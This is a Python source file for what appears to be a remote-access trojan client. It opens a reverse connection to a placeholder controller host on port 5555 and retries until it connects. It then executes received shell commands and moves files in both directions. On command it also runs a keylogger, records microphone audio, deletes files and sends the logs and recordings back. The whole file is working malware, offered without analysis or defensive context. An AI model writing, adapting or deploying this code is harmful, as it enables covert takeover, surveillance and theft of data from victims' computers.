import socket
import time
import subprocess
import json
import os


def reliable_send(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())

def reliable_recv():
        data = ''
        while True:
                try:
                        data = data + s.recv(8760).decode().rstrip()
                        return json.loads(data)
                except ValueError:
                        continue




def connection():
	while True:
		time.sleep(20)
		try:
			s.connect(('Your Host Server IP',5555))
			shell()
			s.close()
			break
		except:
			connection()

from pynput import keyboard

def keyPressed(key):
	with open("keyfile.txt",'a') as  logkey:
		if key == keyboard.Key.esc:
			return False
		try:
			char=key.char or key.space
			logkey.write(char)
			s.settimeout(1)
		except:
			pass


def upload_file(file_name):
	f = open(file_name, 'rb')
	s.send(f.read())

def remove_file(file_name):
	os.remove(file_name)
def remove_dir(dir_name):
	os.rmdir(dir_name)
def makedir(dir_name):
	os.makedirs(dir_name)
def download_file(file_name):
        f = open(file_name, 'wb')
        s.settimeout(1)
        chunk = s.recv(8760)
        while chunk:
                f.write(chunk)
                try:
                        chunk = s.recv(1024)
                except socket.timeout as e:
                        break
        s.settimeout(None)
        f.close()
def listdir(file_name,path='/'):
	f = open(file_name, 'w+')
	dir_list=os.listdir(path)
	for i in dir_list:
		f.writelines(i+'/n')
	s.sendall(f.read())
def makefile(file_name):
	f=open(file_name,'wb+')
	s.settimeout(1)
	chunk=s.recv(8760)
	while chunk:
		f.write(chunk)
		try:
			chunk=s.recv(8760)
		except socket.timeout as e:
			break
	s.settimeout(None)
	f.close()
       

def savefile(sec=10):
	import sounddevice
	from scipy.io.wavfile import write
	rece=sounddevice.rec((sec*44100),samplerate=44100,channels=2)
	sounddevice.wait()
	write("demo.wav",44100,rece)


def shell():
	while True:
		command = reliable_recv()
		if command == 'quit':
			break
		elif command == 'clear':
			pass
		elif command[:3] == 'cd ':
			os.chdir(command[3:])
		elif command[:8] == 'makefile':
                        makefile(command[9:])
		elif command[:7] == 'makedir':
			makedir(command[8:])
		elif command[:8] == 'download':
			upload_file(command[9:])
		elif command[:6] == 'upload':
			download_file(command[7:])
		elif command[:6] == 'remove':
			remove_file(command[7:])
		elif command[:5] == 'rmdir':
			remove_dir(command[6:])
		elif command[:7] == 'listdir':
			listdir("listdirect.txt",path='/')
			upload_file("listdirect.txt")
		elif command == 'vcrecord':
			savefile()
			upload_file("demo.wav")
		elif command[:9] == 'keylogger':
			if __name__ == '__main__':
				listener = keyboard.Listener(on_press=keyPressed)
				listener.start()
				input()
			upload_file("keyfile.txt")
				
		else:
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
			result = execute.stdout.read() + execute.stderr.read()
			result = result.decode()
			reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
